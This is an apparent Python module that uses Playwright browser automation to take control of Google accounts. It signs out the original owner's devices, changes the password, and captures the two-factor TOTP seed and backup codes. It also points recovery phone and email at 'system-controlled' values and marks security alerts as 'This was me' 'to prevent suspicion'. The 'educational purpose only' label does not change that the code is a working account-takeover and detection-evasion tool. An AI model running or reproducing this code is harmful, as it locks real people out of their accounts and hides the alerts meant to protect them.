"""
XIOPATH Phantom Infrastructure — Sanitization Pipeline
========================================================
Severs device linkage between the member's real device and the
phantom account after initial verification. Establishes system-only
2FA and rotates all credentials to system control.

Educational purpose only.
"""

import json
import asyncio
import logging
from typing import Optional
from datetime import datetime, timezone

logger = logging.getLogger("phantom.sanitize")


class SanitizationPipeline:
    """
    Post-creation sanitization for phantom Google accounts.
    Executes: device removal → password rotation → 2FA lockdown →
    backup codes → recovery override → credential vault update.
    """

    def __init__(self, vault, browser_profile_options: dict, fingerprint_script: str):
        """
        Args:
            vault: CredentialVault instance for storing rotated credentials
            browser_profile_options: Playwright context options for the phantom
            fingerprint_script: JS fingerprint injection script
        """
        self.vault = vault
        self.browser_options = browser_profile_options
        self.fingerprint_script = fingerprint_script

    async def sanitize_google_account(self, phantom_id: str, page) -> dict:
        """
        Full sanitization flow for a phantom Google account.
        
        Steps:
            1. Remove the member's real device from the account
            2. Change password to a system-generated one
            3. Enable TOTP 2FA and extract the seed
            4. Generate and store backup codes
            5. Set recovery info to system-controlled endpoints
            6. Dismiss all security alerts
            7. Store all rotated credentials in the vault
        
        Returns:
            {success, totp_seed, backup_codes, password_changed, error}
        """
        result = {
            "success": False,
            "totp_seed": None,
            "backup_codes": [],
            "password_changed": False,
            "devices_removed": 0,
            "error": None,
        }

        try:
            # Step 1: Remove donor's device
            devices_removed = await self.remove_devices(page, keep_current=True)
            result["devices_removed"] = devices_removed

            # Step 2: Rotate password
            from phantom.crypto import generate_password
            new_password = generate_password(length=28)
            pw_changed = await self.change_password(page, new_password)
            result["password_changed"] = pw_changed

            if pw_changed:
                self.vault.update_field(phantom_id, "google.password", new_password)

            # Step 3: Enable 2FA with TOTP
            totp_result = await self.setup_2fa(page)
            if totp_result.get("seed"):
                result["totp_seed"] = totp_result["seed"]
                self.vault.update_field(phantom_id, "google.totp_seed", totp_result["seed"])

            # Step 4: Generate backup codes
            codes = await self.generate_backup_codes(page)
            result["backup_codes"] = codes
            if codes:
                self.vault.update_field(phantom_id, "google.backup_codes", codes)

            # Step 5: Set system-controlled recovery
            await self.set_recovery_info(
                page,
                phone="",   # Configured per-deployment
                email="",   # Configured per-deployment
            )

            # Step 6: Dismiss security alerts
            await self.scrub_security_alerts(page)

            result["success"] = True
            logger.info(f"Sanitization complete for phantom {phantom_id[:8]}")

        except Exception as e:
            result["error"] = str(e)
            logger.error(f"Sanitization failed for {phantom_id[:8]}: {e}")

        return result

    async def remove_devices(self, page, keep_current: bool = True) -> int:
        """
        Remove all devices from the Google account except the current session.
        Navigates to myaccount.google.com/device-activity.
        
        Returns:
            Number of devices removed
        """
        removed = 0
        try:
            await page.goto("https://myaccount.google.com/device-activity", timeout=15000)
            await asyncio.sleep(3)

            # Find device cards
            device_cards = await page.query_selector_all(
                'div[data-device-id], li[class*="device"], div[role="listitem"]'
            )

            for i, card in enumerate(device_cards):
                if keep_current and i == 0:
                    continue  # Skip the first device (current session)

                try:
                    # Click on the device to expand
                    await card.click()
                    await asyncio.sleep(1)

                    # Click 'Sign out' or 'Remove'
                    remove_btn = await page.query_selector(
                        'button:has-text("Sign out"), button:has-text("Remove"), '
                        'button:has-text("Don\'t recognize")'
                    )
                    if remove_btn:
                        await remove_btn.click()
                        await asyncio.sleep(2)

                        # Confirm removal
                        confirm = await page.query_selector(
                            'button:has-text("Sign out"), button:has-text("Yes"), '
                            'button:has-text("Confirm")'
                        )
                        if confirm:
                            await confirm.click()
                            await asyncio.sleep(2)
                            removed += 1

                except Exception as e:
                    logger.debug(f"Could not remove device {i}: {e}")

        except Exception as e:
            logger.error(f"Device removal failed: {e}")

        return removed

    async def change_password(self, page, new_password: str) -> bool:
        """Change the Google account password."""
        try:
            await page.goto("https://myaccount.google.com/signinoptions/password", timeout=15000)
            await asyncio.sleep(3)

            # Google may require re-authentication
            reauth_input = await page.query_selector('input[type="password"]')
            if reauth_input and "challenge" in page.url.lower():
                # Need current password — get from vault
                current = await page.query_selector('input[name="password"], input[type="password"]')
                if current:
                    # Get current password from the identity data
                    identity = self.vault.get_identity(page._phantom_id if hasattr(page, '_phantom_id') else "")
                    if identity:
                        await current.fill(identity.get("google", {}).get("password", ""))
                        next_btn = await page.query_selector('button:has-text("Next")')
                        if next_btn:
                            await next_btn.click()
                            await asyncio.sleep(3)

            # Fill new password
            new_pw_input = await page.query_selector(
                'input[name="password"], input[aria-label*="New password"]'
            )
            confirm_pw_input = await page.query_selector(
                'input[name="confirmation_password"], input[aria-label*="Confirm"]'
            )

            if new_pw_input:
                await new_pw_input.fill(new_password)
                await asyncio.sleep(0.5)
            if confirm_pw_input:
                await confirm_pw_input.fill(new_password)
                await asyncio.sleep(0.5)

            change_btn = await page.query_selector(
                'button:has-text("Change Password"), button:has-text("Change password"), '
                'button[type="submit"]'
            )
            if change_btn:
                await change_btn.click()
                await asyncio.sleep(3)
                return True

        except Exception as e:
            logger.error(f"Password change failed: {e}")

        return False

    async def setup_2fa(self, page) -> dict:
        """
        Enable TOTP-based 2FA on the Google account.
        Captures the QR code, extracts the TOTP seed, and verifies.
        
        Returns:
            {seed, issuer, verified} or {error}
        """
        result = {"seed": None, "issuer": None, "verified": False, "error": None}

        try:
            await page.goto(
                "https://myaccount.google.com/signinoptions/two-step-verification",
                timeout=15000,
            )
            await asyncio.sleep(3)

            # Click 'Get started' or 'Turn on'
            start_btn = await page.query_selector(
                'button:has-text("Get started"), button:has-text("Turn on"), '
                'button:has-text("Add authenticator")'
            )
            if start_btn:
                await start_btn.click()
                await asyncio.sleep(3)

            # Navigate to Authenticator app option
            auth_option = await page.query_selector(
                'div:has-text("Authenticator"), button:has-text("Authenticator app"), '
                'a:has-text("Authenticator")'
            )
            if auth_option:
                await auth_option.click()
                await asyncio.sleep(3)

            # Look for QR code image
            qr_img = await page.query_selector(
                'img[src*="chart.googleapis"], img[alt*="QR"], canvas, '
                'img[data-qr], div[class*="qr"] img'
            )

            if qr_img:
                # Try extracting the otpauth URI from the image src
                src = await qr_img.get_attribute("src")

                # Also try to find the "Can't scan it?" manual entry key
                manual_link = await page.query_selector(
                    'a:has-text("Can\'t scan"), button:has-text("Can\'t scan"), '
                    'a:has-text("enter it manually")'
                )
                if manual_link:
                    await manual_link.click()
                    await asyncio.sleep(2)

                    # Extract the secret key from text
                    secret_element = await page.query_selector(
                        'div[class*="secret"], code, span[class*="key"], '
                        'div:has-text("key") + div'
                    )
                    if secret_element:
                        secret_text = await secret_element.text_content()
                        # Clean the secret (remove spaces)
                        secret_clean = secret_text.strip().replace(" ", "")
                        result["seed"] = secret_clean
                        result["issuer"] = "Google"

                elif src:
                    # Decode QR from the image source
                    from phantom.qr_tools import extract_totp_from_qr
                    totp_data = extract_totp_from_qr(src)
                    if totp_data:
                        result["seed"] = totp_data.get("secret")
                        result["issuer"] = totp_data.get("issuer", "Google")

            # Verify the TOTP by generating and entering a code
            if result["seed"]:
                from phantom.totp_engine import generate_totp
                code = generate_totp(result["seed"])

                verify_input = await page.query_selector(
                    'input[name="totpPin"], input[type="text"][aria-label*="code"], '
                    'input[name="code"]'
                )
                if verify_input:
                    await verify_input.fill(code)
                    await asyncio.sleep(0.5)

                verify_btn = await page.query_selector(
                    'button:has-text("Verify"), button:has-text("Next"), button[type="submit"]'
                )
                if verify_btn:
                    await verify_btn.click()
                    await asyncio.sleep(3)
                    result["verified"] = True

        except Exception as e:
            result["error"] = str(e)
            logger.error(f"2FA setup failed: {e}")

        return result

    async def generate_backup_codes(self, page) -> list[str]:
        """Generate and capture Google backup codes."""
        codes = []
        try:
            await page.goto(
                "https://myaccount.google.com/signinoptions/two-step-verification/backup-codes",
                timeout=15000,
            )
            await asyncio.sleep(3)

            # Click 'Get backup codes' or 'Generate new codes'
            gen_btn = await page.query_selector(
                'button:has-text("Get backup codes"), button:has-text("Generate"), '
                'button:has-text("Get codes")'
            )
            if gen_btn:
                await gen_btn.click()
                await asyncio.sleep(3)

            # Extract codes from the page
            code_elements = await page.query_selector_all(
                'li[class*="code"], div[class*="code"] span, '
                'table td, ol li'
            )
            for el in code_elements:
                text = await el.text_content()
                text = text.strip().replace(" ", "")
                # Backup codes are typically 8 digits
                if text.isdigit() and 6 <= len(text) <= 10:
                    codes.append(text)

        except Exception as e:
            logger.error(f"Backup code generation failed: {e}")

        return codes

    async def set_recovery_info(self, page, phone: str, email: str) -> bool:
        """Set system-controlled recovery phone and email."""
        try:
            # Set recovery phone
            if phone:
                await page.goto(
                    "https://myaccount.google.com/signinoptions/rescuephone",
                    timeout=15000,
                )
                await asyncio.sleep(2)
                phone_input = await page.query_selector('input[type="tel"]')
                if phone_input:
                    await phone_input.fill(phone)
                    next_btn = await page.query_selector('button:has-text("Next"), button[type="submit"]')
                    if next_btn:
                        await next_btn.click()
                        await asyncio.sleep(3)

            # Set recovery email
            if email:
                await page.goto(
                    "https://myaccount.google.com/signinoptions/rescueemail",
                    timeout=15000,
                )
                await asyncio.sleep(2)
                email_input = await page.query_selector('input[type="email"]')
                if email_input:
                    await email_input.fill(email)
                    next_btn = await page.query_selector('button:has-text("Next"), button[type="submit"]')
                    if next_btn:
                        await next_btn.click()
                        await asyncio.sleep(3)

            return True
        except Exception as e:
            logger.error(f"Recovery info setup failed: {e}")
            return False

    async def scrub_security_alerts(self, page) -> bool:
        """Mark all security alerts as 'This was me' to prevent suspicion."""
        try:
            await page.goto("https://myaccount.google.com/notifications", timeout=15000)
            await asyncio.sleep(3)

            # Find and dismiss all security notifications
            dismiss_buttons = await page.query_selector_all(
                'button:has-text("Yes, it was me"), button:has-text("This was me"), '
                'button:has-text("Dismiss")'
            )
            for btn in dismiss_buttons:
                try:
                    await btn.click()
                    await asyncio.sleep(1)
                except Exception:
                    pass

            return True
        except Exception as e:
            logger.error(f"Security alert scrubbing failed: {e}")
            return False


class DeviceDelinker:
    """Removes linked devices from a Google account."""

    async def delink_all_devices(self, page, keep_current: bool = True) -> int:
        """Remove all devices except current session."""
        sanitizer = SanitizationPipeline(None, {}, "")
        return await sanitizer.remove_devices(page, keep_current)

    async def list_devices(self, page) -> list[dict]:
        """List all devices signed into the account."""
        devices = []
        try:
            await page.goto("https://myaccount.google.com/device-activity", timeout=15000)
            await asyncio.sleep(3)

            device_cards = await page.query_selector_all(
                'div[data-device-id], li[class*="device"], div[role="listitem"]'
            )
            for card in device_cards:
                try:
                    text = await card.text_content()
                    device_id = await card.get_attribute("data-device-id")
                    devices.append({
                        "device_id": device_id or f"device-{len(devices)}",
                        "description": text.strip()[:100],
                    })
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Device listing failed: {e}")

        return devices
